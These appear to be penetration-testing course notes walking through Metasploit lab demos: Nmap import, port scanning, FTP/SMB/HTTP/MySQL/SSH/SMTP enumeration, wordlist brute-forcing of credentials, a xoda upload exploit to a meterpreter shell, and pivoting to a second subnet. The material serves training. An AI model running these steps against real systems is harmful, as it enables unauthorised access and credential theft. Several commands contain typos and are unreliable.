# Nmap 

## Port Scanning & Enumeration with Nmap

## Demo: Port Scanning & Enumeration with Nmap

Export Scan in xml format:

`nmap -Pn -sV -O [target IP] -oX windows_server_2012`

`cat windows_server_2012`

## Importing Nmap Scan Results into MSF

## Demo

`ls`

`service postgresql start`

`msfconsole`

`db_status`

we are connected

`workspace`

creating new workspace:

`workspace -a Win2k12`

`db_import /root/windows_server_2012` (Tab autocompletion to see the files)

We check if it imported successfully:

`hosts`

Showing services for the winsrv2012 target:

`services`

We initiate a nmap scan from within the msfconsole:

`workspace`

`workspace -a Nmap_MSF`

`workspace`

`db_nmap -Pn -sV -O [target IP]`

`hosts`

`services`

`vulns`

# Enumeration

## Port Scanning with Auxiliary Modules

- Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
- We can use auxiliary modules to perform both TCP & UDP port scanning as well as enumerating information form services like FTP, SSH, HTTP etc
- Auxiliary modules can be used during the information gathering phase of a pentest as well as the post exploitation phase.
- We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system.

## Lab Infrastructure

- Our objective is to utilize auxiliary modules to discover open ports on our first target.
- The next step will involve exploiting the service running on the target in order to obtain a foothold.
- We will then utilize our foothold to access other systems on a different network subnet (pivoting).
- We will then utilize auxiliary modules to scan for open ports on the second target.
![grafik](https://github.com/user-attachments/assets/9ab0ccac-9823-40da-8442-11f81a0e82b1)

## Demo: Port Scanning with Auxiliary Modules

Obtaining the target IP adress.

`ifconfig`

eth1, replacing 2 with 3

`service postgresql start`

`msfconsole`

msf6:`db_status`

msf6:`workspace -a Port_Scan`

We want to search the portscanner auxiliary module (we start with tcp)

`search portscan`

msf6:`auxiliary/scanner/portscan/tcp`

msf6:`ifconfig`

msf6:`show options`

msf6:`set rhosts [target IP]`

msf6:`run`

We download the Homepage (HTML Code):

msf6:`curl [target IP]`

msf6:`search xoda`

msf6:`use exploit/unix/webapp/xoda_file_upload`

`show options`

msf6:`set rhosts [target IP]`

We need to specify the path of the webApp:

msf6:`set targeturi /`

msf6:`set lhost [ownIP]`

msf6:`show options`

msf6:`exploit`

meterpreter:`sysinfo`

meterpreter:`shell`

`/bin/bash -i`

shell:`ifconfig`

eth1 is in the target 2 subnet (our system (target1) is eth1, for target2 change 2 to 3)

clear out

We add the route (We will be able to perform the scan):

meterpreter:`run autoroute -s [eth1]`

meterpreter:`background`

msf6 xoda exploit:`search portscan`

msf6 xoda exploit:`use portscan`

msf6 xoda exploit:`set rhosts [target2 IP]`

msf6 xoda exploit:`show options`

msf6 xoda exploit:`run`

Now we could start exploiting and pivoting the second target.

Using the UDP module:

msf6:`search udp_sweep`

msf6:`use auxiliary/scanner/discovery/udp_sweep`

msf6:`show options`

msf6:`ifconfig`

msf6:`set rhosts [targetIP]`

## FTP Enumeration

- FTP is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client / clients.
- It is also used as a means of trandferring files to and from the directory of a web server.
- We can use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on targets running an FTP server.
- FTP authenticaton utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously.

## Demo: FTP Enumeration

`service postgresql start`

`ifconfig`

`msfconsole`

msf6:`workspace -a FTP_Enum`

We use a auxiliary module to check the version of FTP. First we check the open ports using a portscan module:

msf6:`use auxiliary/scanner/portscan/tcp`

msf6:`show options`

msf6:`set rhosts [targetIP]`

msf6:`run`

We can't see the service version, so how mentioned earlier:

`back`

msf6:`search ftp`

msf6:`search type:auxiliary name:ftp`

msf6:`use auxiliary/scanner/ftp/ftp_version`

msf6:`show options`

msf6:`set rhosts [targetIP]`

msf6:`run`

We get the service version and the banner.

we could search for example for an proftpd exploit.

### FTP Brute Force auxiliary module

msf6:`search type:auxiliary name:ftp`

msf6:`use auxiliary/scanner/ftp/ftp_login`

msf6:`set rhosts [target IP]`

msf6:`show options`

The options show us, that we need to provide RHOST, USER_FILE/USERNAME, PASS_FILE. Because we don't have a password nor a username, we provide a user_file and a password_file. We use metasploit files

msf6:`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

msf6:`set PASSWORD_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

Start Brute-Force:

msf6:`run`

msf6:`ftp [targetIP]`

The brute-force causes a ddos. so we try another module while we wait for the restart:

we try to login anonymously:

msf6:`search type:auxiliary name: auxiliary`

msf6:`use auxiliary/scanner/ftp/anonymous`

msf6:`show options`

msf6:`set rhosts [target IP]`

msf6:`run`

We can see, that anonymous login is not possible in our case. So we try to login with our obtained credentials. But first we exit metasploit:

msf6:`exit`

`ftp [targetIP]`

*We login with our credentials*

`ls`

`get secret.txt`

`exit`

`ls`

`cat secret.txt`

We obtained the flag.

## SMB Enumeration

- SMB is a network file sharing protocol that is used to facilitate the sharing and peripherals between computers on a local network (LAN).
- SMB uses port 445. (TCP). However, originally, SMB ran on top o NetBIOS using port 139.
- SMB uses port 445 (TCP). Originally, SMB ran on top of NetBIOS using port 139.
- SAMBA is the linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
- We can utilize auxiliary modules to enumerate the SMB version, shares, users and perform a brute-force attack in order to identify users and passwords.

## Demo: SMB Enumeration

`ifconfig`

`service postgresql start`

`workspace -a SMB_ENUM`

`msfconsole`

msf6:`setg rhosts [targetIP]` With "setg" the variable "RHOSTS" with every module we use.

msf6:`search smb`

msf6:`search type:auxiliary name:smb`

msf6:`use auxiliary/scanner/smb/smb_version`

msf6:`run`

Now we could use the Samba version to get a exploit for the target. But instead we're going to look for usernames instead:

msf6:`search type:auxiliary name:smb`

msf6:`use auxiliary/scanner/smb/smb_enumusers`

msf6`run`

We got the usernames. Now we look for shares:

msf6:`search type:auxiliary name:smb`

msf6:`use auxiliary/scanner/smb/smb_enumshares`

msf6:`show options`

msf6:`set ShowFiles true`

msf6:`run`

We try to access the shares through enumerating the password for the user "admin".

msf6:`search smb_login`

msf6:`use 1`

msf6:`show options`

msf6:`set smbuser admin`

msf6:`set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

msf6:`run`

We obtained the admin credentials.

msf6:`exit`

`smbcliient -L \\\\[targetIP]\\ -U admin`

`smbcliient \\\\[targetIP]\\public -U admin`

smb:`ls`

smb:`cd secret`

smb:`get flag.txt`

smb:`exit`

smb:`cat flag.txt`

## Web Server Enumeration

- Web servers utilize HTTP to facilitate the communication between clients and the web server.
- HTTP in an application layer protocol that utilizes TCP port 80 for communication.
- When a webserver uses a SSL certificate, its HTTPS (port 443)
- We can utilize auxiliary modules to enumerate the web server version, HTTP headers, brute-force directories and more.
- Examples of popular web servers are: Apache, NGINX and MS IIS

## ## Demo: Web Server Enumeration

`ifconfig`

`service postgresql start`

`msfconsole`

msf6:`workspace -a Web_Enum`

msf6:`setg rhosts [targetIP]`

msf6:`setg rhost [targetIP]`

msf6:`search http`

msf6:`search type:auxiliary name:http`

msf6:`use auxiliary/Scanner/http/http_version`

msf6:`show options`: If we would deal with a website with SSL cert, we would have to change the port and the SSL variable to true.

msf6:`run`

msf6:`seatch http_header`

msf6:`use auxiliary/scanner/http/http_header`

msf6:`show options`

msf6:`run`

We enumerated info about the webserver, just like with the previus module.

We enumerate now information about hidden directories, which we probably don't have access to:

msf6:`search robots.txt`

msf6:`use 0`

msf6:`show options`

msf6:`run`

msf6:`curl http://[targetIP]/data/`

msf6:`curl http://[targetIP]/secure/`

Becuase the secure directory is password-protected, we need to obtain credentials through a brute-force. But first, we perform directory search with directory brute-forcing:

msf6:`search dir_scanner`

msf6:`use 1`

msf6:`show options`

If we wanted, for example, do a brute-force on the secure folder, we could specify that with the "PATH" variable.

msf6:`run`

msf6:`search files_Dir`

msf6:`use 1`

msf6:`show options`

msf6:`run`

msf6:`search hhtp_login`

msf6:`use auxiliary/scanner/http/http_login`

msf6:`show options`

msf6:`set AUTH_URI /secure/`

msf6:`unset USERPASS_FILE`: Because we have a userfile and passfile specified

msf6:`run`

Failed brute-force. We change the user and pass files to a "stronger" file:

msf6:`set user_file /usr/share/metasploit-framework/data/wordlists/namelist.txt`

msf6:`set pass_file /usr/share/metasploit-framework/daata/wordlists/unix_passwords.txt`

msf6:`set verbose false`

msf6:`run`

Still no credentials.

msf6:`search apache_userdir_enum`

msf6:`use auxiliary/scanner/http/apache_userdir_enum`

msf6:`show options`

msf6:`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

msf6:`run`

msf6:`search http_login`

msf6:`use auxiliary/scanner/http/http_login`

msf6:`echo "rooty" > user.txt`

msf6:`set user_file /root/user.txt `

msf6:`run`

We ran followed auxiliary modules;


    auxiliary/scanner/http/apache_userdir_enum
    auxiliary/scanner/http/brute_dirs
    auxiliary/scanner/http/dir_scanner
    auxiliary/scanner/http/dir_listing
    auxiliary/scanner/http/http_put
    auxiliary/scanner/http/files_dir
    auxiliary/scanner/http/http_login
    auxiliary/scanner/http/http_header
    auxiliary/scanner/http/http_version
    auxiliary/scanner/http/robots_txt

## Demo: Web Server Enumeration

## MYSQL Enumeration

- My SQL is a relational database management system based on SQL
- It is typically used to store records, customer data, and is most commonly deployed to store web application data.
- MySQL utilizes TCP port 3306 by default, however, like any service it can be hosted on any open TCP port.
- We can utilize auxiliary modules to enumerate the version of MySQL, perfon brute-force attacks to identify passwords, execute SQL queries and much more.

## Demo: MYSQL Enumeration

`ifconfig`

`service postgresql start && msfconsole`

msf6:`workspace -a MYSQL_ENUM`

msf6:`setg rhosts [targetIP]`

msf6:`setg rhost [targetIP]`

msf6:`search portscan`

msf6:`use auxiliary/scanner/portscan/tcp`

msf6:`show options`

msf6:`run`

msf6:`search type:auxiliary name:mysql`

msf6:`use auxiliary/scanner/mysql/mysql_version`

msf6:`show options`

msf6:`run`

We got MYSQL on v5.5.61. because there is no exploit for this version, we perform a brute-force for root-credentials:

msf6:`seach mysql_login`

msf6:`use auxiliary/scanner/mysql/mysql_login`

msf6:`show options`

msf6:`set username root`

msf6:`set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

msf6:`set verbose false`

msf6:`run`

We obtained the credentials.

Now we perform mysql enumeration:

msf6:`search mysql_enum`

msf6:`use auxiliary/admin/mysql/mysql_enum`: Because its in the admin subdir, which means we need the credentials we obtained.

msf6:`set PASSWORD twinkle`

msf6:`set USERNAME root`

msf6:`run`

The next module is for executing sql queries

msf6:`search mysql_sql`: Here we also need credentials

msf6:`use auxiliary/admin/mysql/mysql_sql`

msf6:`set password twinkle`

msf6:`set username root`

Eventually we need to specify the "SQL" variable. select version() would be for extracting the version.

msf6:`run`

msf6:`set sql show databases;`: Sends a statement, Shows us the databases

msf6:`set SQL use videos;`

Module for learning more about the schema:

msf6:`search mysql_schema`

msf6:`use auxiliary/scanner/mysql/mysql_Schemadump`

msf6:`show options`

msf6:`set password twinkle`

msf6:`set username root`

msf6:`hosts`

msf6:`services`

msf6:`loot`

msf6:`creds`

msf6:`exit`

`mysql -h [targetIP] -u root -p` twinkle

Now we have access to the mysql database server.

`use videos;`

`show tables;`

## SSH Enumeration

- SSH is a remote administration protocol that offers encryption and is the successor to Telnet.
- It is typically used for remote access to servers and systems.
- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
- We can utilize auxiliary modules to enumerate the version of SSH running on the target as well as perform brute-force attacks to identify passwords that can consequently provide us remote access to a target.

## Demo: SSH Enumeration

`serivce postgresql start && msfconsole`

msf6:`workspace -a SSH_ENUM`

msf6:`setg rhosts [targetIP]`

msf6:`search type:auxiliary name:ssh`

msf6:`use auxiliary/scanner/ssh/ssh_version`

msf6:`run`

We enumerated the version and OS etc.

msf6:`search type:auxiliary name:ssh`

If the target has password authentication, we use the ssh_login module. If it has public/key authentication, we use the login_pubkey module.

msf6:`use auxiliary/scanner/ssh/ssh_login`

msf6:`set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt`

msf6:`set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`

msf6:`run`

We've got some credentials.

The module created a session for us :

msf6:`sessions`

msf6:`sessions 1`

`/bin/bash -i`

bash:`ls`

bash:`whoami`

bash:`e`

bash: `exit`

msf6:`sessions`: No active sessions anymore

msf6:`search type:auxiliary name:ssh`

msf6:`auxiliary/scanner/ssh/ssh_enumusers`

msf6:`show options`

msf6:`set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt`

## SMTP Enumeration

- SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
- SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
- We can utilize auxiliary modules to enumerate the version of SMTP as well as user accounts on the target system.

## Demo: SMTP Enumeration

`ifconfig`

`nmap -Pn [targetIP]`: We want to detect on which port smtp is running on

`service postgresql && msfconsole`

msf6:`workspace -a SMTP_Enum`

msf6:`setg rhosts [target IP]`

msf6:`search type:auxiliary name:smtp`

msf6:`suse auxiliary/scanner/smtp/smtp_version`

msf6:`show options`

msf6:`run`

We get he version, domain etc

msf6:`search type:auxiiary name:smtp`

msf6:`use auxiliary/scanner/smtp/smtp_enum`

msf6:`run`

Now we could perform a brute-force on the users and gain access to SMTP.









































